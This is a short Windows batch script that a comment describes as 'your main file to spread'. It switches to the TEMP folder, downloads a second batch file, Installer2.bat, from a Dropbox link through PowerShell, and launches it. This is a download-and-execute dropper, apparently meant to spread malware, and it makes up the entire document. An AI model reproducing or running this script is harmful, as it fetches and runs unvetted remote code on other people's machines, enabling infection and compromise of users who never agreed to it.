REM - This is your main file to spread.

cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://www.dropbox.com/s/ngz2gx1fd3fbj96/Installer2.bat?dl=1' -OutFile Installer2.bat"
start Installer2.bat